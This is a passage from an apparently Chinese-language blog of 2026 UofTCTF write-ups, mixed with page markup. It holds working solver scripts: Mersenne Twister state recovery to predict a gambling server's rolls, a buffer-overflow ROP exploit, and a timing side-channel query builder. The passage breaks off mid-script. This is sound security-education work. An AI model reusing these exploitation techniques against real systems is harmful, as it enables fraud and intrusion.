y = undo_left_shift_xor_mask(y, 7, 0x9d2c5680) y = undo_right_shift_xor(y, 11) return y def calculate_roll(server_seed, client_seed, nonce): nonce_client_msg = f\"{client_seed}-{nonce}\".encode() sig = hmac.new(str(server_seed).encode(), nonce_client_msg, hashlib.sha256).hexdigest() index = 0 lucky = int(sig[index*5:index*5+5], 16) while (lucky \u003e= 1e6): index += 1 lucky = int(sig[index * 5:index * 5 + 5], 16) if (index * 5 + 5 \u003e 129): lucky = 9999 break return round((lucky % 1e4) * 1e-2) class RemoteConnection: def __init__(self, host, port): self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) self.s.connect((host, port)) self.buffer = b\"\" def read_until(self, delimiter): while delimiter.encode() not in self.buffer: data = self.s.recv(1024) if not data: break self.buffer += data if delimiter.encode() in self.buffer: pos = self.buffer.find(delimiter.encode()) + len(delimiter) result = self.buffer[:pos] self.buffer = self.buffer[pos:] return result.decode() return \"\" def read_line(self): while b\"\\n\" not in self.buffer: data = self.s.recv(1024) if not data: if self.buffer: # Return remaining buffer as line res = self.buffer self.buffer = b\"\" return res.decode() return None self.buffer += data pos = self.buffer.find(b\"\\n\") + 1 result = self.buffer[:pos] self.buffer = self.buffer[pos:] return result.decode() def send_line(self, line): self.s.sendall((line + \"\\n\").encode()) def close(self): self.s.close() def solve(): HOST = \"34.162.20.138\" PORT = 5000 print(f\"Connecting to {HOST}:{PORT}...\") conn = RemoteConnection(HOST, PORT) # Initial prompt print(\"Reading initial banner...\") conn.read_until(\"\u003e \") # Step 1: Play 624 games to collect seeds print(\"Step 1: Playing 624 games to collect seeds...\") conn.send_line(\"b\") # gamble conn.read_until(\"Wager per game (min-wager is\") # variable conn.read_until(\": \") conn.send_line(\"1\") # wager 1 conn.read_until(\"Number of games (int): \") conn.send_line(\"624\") # 624 games conn.read_until(\"Enter your number higher or equal to the roll between 2-98 (prize improves with lower numbers): \") conn.send_line(\"98\") # safe bet conn.read_until(\"Do you wish to proceed? (Y/N)\") conn.send_line(\"Y\") # Read output and parse seeds server_seeds = [] # We expect 624 lines of game output buffer = \"\" while True: line = conn.read_line() if not line: break # Print progress every 50 lines if len(server_seeds) % 50 == 0 and \"Server-Seed\" in line: print(line.strip()) if \"Server-Seed:\" in line: match = re.search(r\"Server-Seed: (\\d+)\", line) if match: server_seeds.append(int(match.group(1))) if \"Final Balance\" in line: buffer = line # Keep final balance line break print(f\"Collected {len(server_seeds)} seeds.\") if len(server_seeds) != 624: print(\"Error: Did not collect 624 seeds.\") conn.close() return # Step 2: Reconstruct PRNG state print(\"Step 2: Reconstructing PRNG state...\") state_vals = [untemper(y) for y in server_seeds] reconstructed_state = (3, tuple(state_vals + [624]), None) r = random.Random() r.setstate(reconstructed_state) # Current nonce is 624 nonce = 624 client_seed = \"1337awesome\" # Check current balance match = re.search(r\"Final Balance: ([\\d\\.]+)\", buffer) current_balance = float(match.group(1)) if match else 0 print(f\"Current Balance: {current_balance}\") # Wait for prompt after game loop conn.read_until(\"\u003e \") # Step 3: Win until rich while current_balance \u003c 10000: # Predict next seed next_server_seed = r.getrandbits(32) # Calculate roll roll = calculate_roll(next_server_seed, client_seed, nonce) print(f\"Predicted next roll (Nonce {nonce}): {roll}\") min_wager = current_balance / 800.0 # Round min_wager up slightly to avoid float precision issues if server is strict # But server uses `wager \u003c self.balance/800` bet_amount = min_wager greed = 98 if roll \u003c= 98: bet_amount = current_balance greed = max(2, roll) print(f\"WINNING OPPORTUNITY! Betting {bet_amount} on {greed}\") else: print(\"Losing roll. Betting minimum.\") # Execute bet conn.send_line(\"b\") conn.read_until(\"Wager per game\") conn.read_until(\": \") conn.send_line(str(bet_amount)) conn.read_until(\"Number of games (int): \") conn.send_line(\"1\") conn.read_until(\"Enter your number higher or equal to the roll\") conn.send_line(str(greed)) conn.read_until(\"Do you wish to proceed? (Y/N)\") conn.send_line(\"Y\") # Read result line = conn.read_line() # Game output print(line.strip()) while \"Final Balance\" not in line: line = conn.read_line() print(line.strip()) if \"Final Balance\" in line: match = re.search(r\"Final Balance: ([\\d\\.]+)\", line) if match: current_balance = float(match.group(1)) print(f\"New Balance: {current_balance}\") break conn.read_until(\"\u003e \") nonce += 1 if current_balance \u003e= 10000: print(\"Target balance reached!\") break # Step 4: Buy Flag print(\"Step 4: Buying Flag...\") conn.send_line(\"a\") # Shop conn.read_until(\"\u003e \") conn.send_line(\"a\") # Buy flag print(\"Reading flag...\") while True: line = conn.read_line() if not line: break print(\"OUTPUT LINE:\", line.strip()) if \"uoftctf{\" in line: print(\"FLAG FOUND:\", line.strip()) break if \"options:\" in line: # Back to menu break conn.close() if __name__ == \"__main__\": solve() UofT LFSR Labyrinth | 状态:running｜Reproduction 题目描述\nA quirky 48-bit UofT stream taps through a WG-flavoured filter, leaving 80 bits of trace and a sealed flag. The blueprint is public; the hidden state is the dance you need to unravel.\nWriteUp\n暂无\nMAT247 | 状态:running｜Reproduction 题目描述\nIf V admits a T-cyclic vector, and ST=TS, show that S = p(T) for some polynomial T.\nWriteUp\n暂无\nOrca | 状态:running｜Reproduction 题目描述\nOrcas eat squids :(\n​nc 34.186.247.84 5000​\nWriteUp\n暂无\nRotor Cipher | 状态:running｜Reproduction 题目描述\nWe captured a rotor cipher, but they destroyed the rotors before we got to it. Can you recover the rotor wiring?\nWriteUp\n暂无\nMAT347 | 状态:running｜Reproduction 题目描述\nGroups, Rings, and Fields. But only groups (and modules!).\n​nc 104.196.21.25 5000​\nWriteUp\n暂无\nPwn Baby bof | 状态:solved｜Live 题目描述\nPeople said gets is not safe, but I think I figured out how to make it safe.\n​nc 34.48.173.44 5000​\nWriteUp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 from pwn import * context.arch = 'amd64' context.log_level = 'debug' exe = './chall' elf = context.binary = ELF(exe, checksec=False) if args.REMOTE: io = remote('34.48.173.44', 5000) else: io = process(exe) WIN = elf.symbols['win'] # 0x4011F6 rop = ROP(elf) RET = rop.find_gadget(['ret'])[0] payload = b'A' * 7 payload += b'\\x00' payload += b'B' * (24 - len(payload)) payload += p64(RET) payload += p64(WIN) io.recvuntil(b'What is your name') io.sendline(payload) io.interactive() extended-eBPF | 状态:running｜Reproduction 题目描述\nI extended the eBPF because its cool.\nNote: You can log in as the ctf user\n​nc 34.26.243.6 5000​\nWriteUp\n暂无\nCalculator | 状态:running｜Reproduction 题目描述\nLook at this very simple calculator I implemented in c++.\n​nc 34.162.229.67 5000​\nWriteUp\n暂无\nuprobe | 状态:running｜Reproduction 题目描述\nuprobes are cool\nNote: You can log in as the ctf user\n​nc 136.107.76.27 5000​\nWriteUp\n暂无\nAES AEAD| 状态:running｜Reproduction 题目描述\nWe tried rolling our own crypto. What could possibly go wrong?\n​nc 35.185.46.39 5000​\nWriteUp\n暂无\n","wordCount":"7244","inLanguage":"en","datePublished":"2026-01-11T18:30:20+08:00","dateModified":"2026-01-13T22:15:47+08:00","author":{"@type":"Person","name":"Wh1teJ0ker"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://wh1tej0ker.github.io/post/2026uoftctf-zv00ly.html"},"publisher":{"@type":"Organization","name":"Wh1teJ0kerのBlog","logo":{"@type":"ImageObject","url":"https://wh1tej0ker.github.io/favicon.ico"}}}</script><link rel=icon type=image/png href=/favicon.ico sizes=16x16><link rel=apple-touch-icon href=/favicon.ico><link rel=manifest href=/favicon.ico><link rel=stylesheet href=https://cdn.staticfile.org/lxgw-wenkai-webfont/1.6.0/style.css><link rel=stylesheet href=/css/main.min.10261e11331d1957a67a7a72f16bb5db1759ff46265895f1ecb6d0309da4eb43.css integrity="sha256-ECYeETMdGVemenpy8Wu12xdZ/0YmWJXx7LbQMJ2k60M=" crossorigin=anonymous media=screen><link rel=stylesheet href=/scss/highlight/github-dark.min.min.66034289ee9a113219a2c4aae0a8bd2095ab255c832a42efcf5863f10814e7a1.css><script src=/js/highlight.min.min.c607d6febd16934a82eb61d3a896ed9d869f54373cc63ce95864ed5488fe3128.js></script><script>hljs.highlightAll()</script></head><body><main class=wrapper><nav class=navigation><section class=container><a class=navigation-brand href=/>HOME
</a><input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle><span></span><span></span><span></span></label><ul class=navigation-list id=navigation-list><li class="navigation-item navigation-menu"><a class=navigation-link href=/categories/>分类</a></li><li class="navigation-item navigation-menu"><a class=navigation-link href=/archives/>归档</a></li><li class="navigation-item navigation-menu"><a class=navigation-link href=/friends/>友链</a></li><li class="navigation-item navigation-menu"><a class=navigation-link href=/about/>关于</a></li><li class="navigation-item navigation-menu"><a class=navigation-link href=https://cloud.umami.is/share/5RZUCwaG2fOysYPa/wh1tej0ker.github.io>Dashboard</a></li><li class="navigation-item menu-separator"><span>|</span></li><li class="navigation-item navigation-social"><a class=navigation-link href=https://github.com/Wh1teJ0ker><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-github"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37.0 00-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44.0 0020 4.77 5.07 5.07.0 0019.91 1S18.73.65 16 2.48a13.38 13.38.0 00-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07.0 005 4.77 5.44 5.44.0 003.5 8.55c0 5.42 3.3 6.61 6.44 7A3.37 3.37.0 009 18.13V22"/></svg></a></li><li class="navigation-item navigation-search"><a href=javascript:void(0) id=search-btn><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-search"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg></a></li></ul></section></nav><div id=content><article class=blog-single><header class=blog-title><h1>2026UofTCTF</h1></header><p><small>January 11, 2026&nbsp;· &nbsp;·</small><p><div class=blog-body><div class=blog-toc><details open class=toc-details><summary class=toc-summary>目录</summary><div class=toc-content><nav id=TableOfContents><ul><li><a href=#reverse-wordle--状态solvedlive>Reverse Wordle | 状态:solved｜Live</a></li><li><a href=#encryption-service--状态runningreproduction>Encryption Service | 状态:running｜Reproduction</a></li><li><a href=#guess-the-number--状态solvedlive>Guess The Number | 状态:solved｜Live</a></li><li><a href=#lottery--状态runningreproduction>Lottery | 状态:running｜Reproduction</a></li><li><a href=#kk-training-room--状态runningreproduction>K&amp;K Training Room | 状态:running｜Reproduction</a></li><li><a href=#file-upload--状态runningreproduction>File Upload | 状态:running｜Reproduction</a></li><li><a href=#vibe-code--状态runningreproduction>Vibe Code | 状态:running｜Reproduction</a></li><li><a href=#nothing-ever-changes--状态runningreproduction>Nothing Ever Changes | 状态:running｜Reproduction</a></li></ul><ul><li><a href=#go-go-coaster--状态solvedlive>Go Go Coaster! | 状态:solved｜Live</a></li><li><a href=#go-go-cabinet--状态runningreproduction>Go Go Cabinet! | 状态:running｜Reproduction</a></li><li><a href=#my-shikishi-is-fake--状态runningreproduction>My Shikishi is Fake! | 状态:running｜Reproduction</a></li><li><a href=#t1--状态solvedrunningreproduction>T1 | 状态:solved/running｜Reproduction</a></li></ul><ul><li><a href=#baby-exfil--状态solvedlive>Baby Exfil | 状态:solved｜Live</a></li><li><a href=#my-pokemon-card-is-fake--状态runningreproduction>My Pokemon Card is Fake! | 状态:running｜Reproduction</a></li></ul><ul><li><a href=#no-quotes--状态solvedlive>No Quotes | 状态:solved｜Live</a></li><li><a href=#firewall--状态runningreproduction>Firewall | 状态:running｜Reproduction</a></li><li><a href=#personal-blog--状态runningreproduction>Personal Blog | 状态:running｜Reproduction</a></li><li><a href=#no-quotes-2--状态runningreproduction>No Quotes 2 | 状态:running｜Reproduction</a></li><li><a href=#no-quotes-3--状态runningreproduction>No Quotes 3 | 状态:running｜Reproduction</a></li><li><a href=#pasteboard--状态runningreproduction>Pasteboard | 状态:running｜Reproduction</a></li><li><a href=#unrealistic-client-side-challenge---flag-1--状态runningreproduction>Unrealistic Client-Side Challenge - Flag 1 | 状态:running｜Reproduction</a></li><li><a href=#vulnerability-research--状态runningreproduction>Vulnerability Research | 状态:running｜Reproduction</a></li><li><a href=#unrealistic-client-side-challenge---flag-2--状态runningreproduction>Unrealistic Client-Side Challenge - Flag 2 | 状态:running｜Reproduction</a></li></ul><ul><li><a href=#baby-obfuscated-flag-checker--状态solvedlive>Baby (Obfuscated) Flag Checker | 状态:solved｜Live</a></li><li><a href=#bring-your-own-program--状态runningreproduction>Bring Your Own Program | 状态:running｜Reproduction</a></li><li><a href=#symbol-of-hope--状态runningreproduction>Symbol of Hope | 状态:running｜Reproduction</a></li><li><a href=#will-u-accept-some-magic--状态runningreproduction>Will u Accept Some Magic? | 状态:running｜Reproduction</a></li><li><a href=#ml-connoisseur--状态runningreproduction>ML Connoisseur | 状态:running｜Reproduction</a></li></ul><ul><li><a href=#leaked-d--状态solvedlive>Leaked d | 状态:solved｜Live</a></li><li><a href=#gamblers-fallacy--状态solvedlive>Gambler&rsquo;s Fallacy | 状态:solved｜Live</a></li><li><a href=#uoft-lfsr-labyrinth--状态runningreproduction>UofT LFSR Labyrinth | 状态:running｜Reproduction</a></li><li><a href=#mat247--状态runningreproduction>MAT247 | 状态:running｜Reproduction</a></li><li><a href=#orca--状态runningreproduction>Orca | 状态:running｜Reproduction</a></li><li><a href=#rotor-cipher--状态runningreproduction>Rotor Cipher | 状态:running｜Reproduction</a></li><li><a href=#mat347--状态runningreproduction>MAT347 | 状态:running｜Reproduction</a></li></ul><ul><li><a href=#baby-bof--状态solvedlive>Baby bof | 状态:solved｜Live</a></li><li><a href=#extended-ebpf--状态runningreproduction>extended-eBPF | 状态:running｜Reproduction</a></li><li><a href=#calculator--状态runningreproduction>Calculator | 状态:running｜Reproduction</a></li><li><a href=#uprobe--状态runningreproduction>uprobe | 状态:running｜Reproduction</a></li><li><a href=#aes-aead-状态runningreproduction>AES AEAD| 状态:running｜Reproduction</a></li></ul></nav></div></details></div><div class=blog-content-wrapper><section class=blog-content><h1 id=2026uoftctf>2026UofTCTF</h1><h1 id=misc>Misc</h1><h2 id=reverse-wordle--状态solvedlive>Reverse Wordle | 状态:solved｜Live</h2><p><strong>题目描述</strong></p><p>My friend said they always use the same starting word, can you help me find out what it is?</p><p>Submit the sha256 hash of the ALL CAPS word wrapped in the flag format uoftctf{&mldr;}</p><p><strong>WriteUp</strong></p><p>把三局的“第一行反馈”分别用三局答案去约束（1=REBUT，67=CRASS，1336=DITTY）后，在官方可猜词表里唯一能同时满足三组反馈的起手词是：SQUIB。</p><ul><li>Wordle 1 答案：REBUT</li><li>Wordle 67 答案：CRASS</li><li>Wordle 1336 答案：DITTY</li></ul><p>对 ALL CAPS 的 SQUIB 做 SHA-256 得到：64b28ded00856c89688f8376f58af02dc941535cbb0b94ad758d2a77b2468646</p><p>所以正确提交是：</p><p><strong>uoftctf{64b28ded00856c89688f8376f58af02dc941535cbb0b94ad758d2a77b2468646}</strong></p><h2 id=encryption-service--状态runningreproduction>Encryption Service | 状态:running｜Reproduction</h2><p><strong>题目描述</strong></p><p>We made an encryption service. We forgot to make the decryption though. As compensation we are giving free encrypted flags</p><p>​<code>nc 34.86.4.154 5000</code>​</p><p><strong>WriteUp</strong></p><p>奇怪的漏洞点，很新鲜，没见过，再看看</p><h2 id=guess-the-number--状态solvedlive>Guess The Number | 状态:solved｜Live</h2><p><strong>题目描述</strong></p><p>Guess my super secret number</p><p>​<code>nc 35.231.13.90 5000</code>​</p><p><strong>WriteUp</strong></p><p>单纯的猜测，在未知量是 100 bit，每次询问只回 Yes/No，最多 1 bit 信息。50 次最多 50 bit 信息，不够唯一确定 x。</p><p>因此需要构造延时条件做侧信道</p><p>这里构造了以下两个延时组件：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>delay_true_expr</span>  <span class=o>=</span> <span class=p>(</span><span class=mi>2</span> <span class=o>**</span> <span class=n>DELAY_EXP</span><span class=p>)</span> <span class=o>&gt;</span> <span class=mi>0</span>   <span class=c1># 计算很慢，但结果恒 True</span>
</span></span><span class=line><span class=cl><span class=n>delay_false_expr</span> <span class=o>=</span> <span class=p>(</span><span class=mi>2</span> <span class=o>**</span> <span class=n>DELAY_EXP</span><span class=p>)</span> <span class=o>&lt;</span> <span class=mi>0</span>   <span class=c1># 计算很慢，但结果恒 False</span>
</span></span></code></pre></td></tr></table></div></div><p>Python 的 and/or 是短路的：A and B：如果 A 为 False，B 根本不会算，A or B：如果 A 为 True，B 根本不会算，而evaluate() 里写的就是 Python 原生的 and/or，所以短路同样成立。</p><p>本地很快就通了，但是远程一直不行，网络背大锅，导致一直调大参数</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>pwn</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>sys</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Set logging level</span>
</span></span><span class=line><span class=cl><span class=n>pwn</span><span class=o>.</span><span class=n>context</span><span class=o>.</span><span class=n>log_level</span> <span class=o>=</span> <span class=s1>&#39;info&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>solve</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>)</span> <span class=o>&gt;</span> <span class=mi>2</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>host</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>port</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>2</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>host</span> <span class=o>=</span> <span class=s2>&#34;35.231.13.90&#34;</span>
</span></span><span class=line><span class=cl>        <span class=n>port</span> <span class=o>=</span> <span class=mi>5000</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>pwn</span><span class=o>.</span><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Connecting to </span><span class=si>{</span><span class=n>host</span><span class=si>}</span><span class=s2>:</span><span class=si>{</span><span class=n>port</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span> <span class=o>=</span> <span class=n>pwn</span><span class=o>.</span><span class=n>remote</span><span class=p>(</span><span class=n>host</span><span class=p>,</span> <span class=n>port</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>DELAY_EXP</span> <span class=o>=</span> <span class=mi>80000000</span>
</span></span><span class=line><span class=cl>    <span class=n>TIME_THRESHOLD</span> <span class=o>=</span> <span class=mf>2.5</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=c1># Range [L, R)</span>
</span></span><span class=line><span class=cl>    <span class=n>L</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=n>R</span> <span class=o>=</span> <span class=mi>1</span> <span class=o>&lt;&lt;</span> <span class=mi>100</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=c1># Delay expressions</span>
</span></span><span class=line><span class=cl>    <span class=c1># DelayTrue: Returns True, Slow</span>
</span></span><span class=line><span class=cl>    <span class=c1># DelayFalse: Returns False, Slow</span>
</span></span><span class=line><span class=cl>    <span class=n>delay_true_expr</span> <span class=o>=</span> <span class=p>{</span><span class=s1>&#39;op&#39;</span><span class=p>:</span> <span class=s1>&#39;&gt;&#39;</span><span class=p>,</span> <span class=s1>&#39;arg1&#39;</span><span class=p>:</span> <span class=p>{</span><span class=s1>&#39;op&#39;</span><span class=p>:</span> <span class=s1>&#39;**&#39;</span><span class=p>,</span> <span class=s1>&#39;arg1&#39;</span><span class=p>:</span> <span class=mi>2</span><span class=p>,</span> <span class=s1>&#39;arg2&#39;</span><span class=p>:</span> <span class=n>DELAY_EXP</span><span class=p>},</span> <span class=s1>&#39;arg2&#39;</span><span class=p>:</span> <span class=mi>0</span><span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>delay_false_expr</span> <span class=o>=</span> <span class=p>{</span><span class=s1>&#39;op&#39;</span><span class=p>:</span> <span class=s1>&#39;&lt;&#39;</span><span class=p>,</span> <span class=s1>&#39;arg1&#39;</span><span class=p>:</span> <span class=p>{</span><span class=s1>&#39;op&#39;</span><span class=p>:</span> <span class=s1>&#39;**&#39;</span><span class=p>,</span> <span class=s1>&#39;arg1&#39;</span><span class=p>:</span> <span class=mi>2</span><span class=p>,</span> <span class=s1>&#39;arg2&#39;</span><span class=p>:</span> <span class=n>DELAY_EXP</span><span class=p>},</span> <span class=s1>&#39;arg2&#39;</span><span class=p>:</span> <span class=mi>0</span><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>50</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>size</span> <span class=o>=</span> <span class=n>R</span> <span class=o>-</span> <span class=n>L</span>
</span></span><span class=line><span class=cl>        <span class=n>pwn</span><span class=o>.</span><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Round </span><span class=si>{</span><span class=n>i</span><span class=si>}</span><span class=s2>: Range=[</span><span class=si>{</span><span class=n>L</span><span class=si>}</span><span class=s2>, </span><span class=si>{</span><span class=n>R</span><span class=si>}</span><span class=s2>) size=</span><span class=si>{</span><span class=n>size</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>size</span> <span class=o>&lt;=</span> <span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=c1># Burn remaining rounds</span>
</span></span><span class=line><span class=cl>            <span class=n>pwn</span><span class=o>.</span><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s2>&#34;Found number (or close enough), burning rounds&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;: &#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>io</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=k>continue</span>
</span></span><span class=line><span class=cl>            
</span></span><span class=line><span class=cl>        <span class=c1># Calculate cut points</span>
</span></span><span class=line><span class=cl>        <span class=n>M1</span> <span class=o>=</span> <span class=n>L</span> <span class=o>+</span> <span class=p>(</span><span class=n>size</span> <span class=o>*</span> <span class=mi>1</span><span class=p>)</span> <span class=o>//</span> <span class=mi>4</span>
</span></span><span class=line><span class=cl>        <span class=n>M2</span> <span class=o>=</span> <span class=n>L</span> <span class=o>+</span> <span class=p>(</span><span class=n>size</span> <span class=o>*</span> <span class=mi>2</span><span class=p>)</span> <span class=o>//</span> <span class=mi>4</span>
</span></span><span class=line><span class=cl>        <span class=n>M3</span> <span class=o>=</span> <span class=n>L</span> <span class=o>+</span> <span class=p>(</span><span class=n>size</span> <span class=o>*</span> <span class=mi>3</span><span class=p>)</span> <span class=o>//</span> <span class=mi>4</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=c1># Logic:</span>
</span></span><span class=line><span class=cl>        <span class=c1># Query = ( (x &gt;= M2) and ( (x &lt; M3) or DelayTrue ) ) or ( (x &gt;= M1) and DelayFalse )</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=c1># Construct parts</span>
</span></span><span class=line><span class=cl>        <span class=c1># P1 = (x &gt;= M2)</span>
</span></span><span class=line><span class=cl>        <span class=n>p1</span> <span class=o>=</span> <span class=p>{</span><span class=s1>&#39;op&#39;</span><span class=p>:</span> <span class=s1>&#39;&gt;=&#39;</span><span class=p>,</span> <span class=s1>&#39;arg1&#39;</span><span class=p>:</span> <span class=s1>&#39;x&#39;</span><span class=p>,</span> <span class=s1>&#39;arg2&#39;</span><span class=p>:</span> <span class=n>M2</span><span class=p>}</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=c1># P2 = (x &lt; M3) or DelayTrue</span>
</span></span><span class=line><span class=cl>        <span class=n>p2</span> <span class=o>=</span> <span class=p>{</span><span class=s1>&#39;op&#39;</span><span class=p>:</span> <span class=s1>&#39;or&#39;</span><span class=p>,</span> <span class=s1>&#39;arg1&#39;</span><span class=p>:</span> <span class=p>{</span><span class=s1>&#39;op&#39;</span><span class=p>:</span> <span class=s1>&#39;&lt;&#39;</span><span class=p>,</span> <span class=s1>&#39;arg1&#39;</span><span class=p>:</span> <span class=s1>&#39;x&#39;</span><span class=p>,</span> <span class=s1>&#39;arg2&#39;</span><span class=p>:</span> <span class=n>M3</span><span class=p>},</span> <span class=s1>&#39;arg2&#39;</span><span class=p>:</span> <span class=n>delay_true_expr</span><span class=p>}</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=c1># Left Side = P1 and P2</span>
</span></span><span class=line><span class=cl>        <span class=n>left_side</span> <span class=o>=</span> <span class=p>{</span><span class=s1>&#39;op&#39;</span><span class=p>:</span> <span class=s1>&#39;and&#39;</span><span class=p>,</span> <span class=s1>&#39;arg1&#39;</span><span class=p>:</span> <span class=n>p1</span><span class=p>,</span> <span class=s1>&#39;arg2&#39;</span><span class=p>:</span> <span class=n>p2</span><span class=p>}</span>
</span></span><span class=line><span class=cl>        
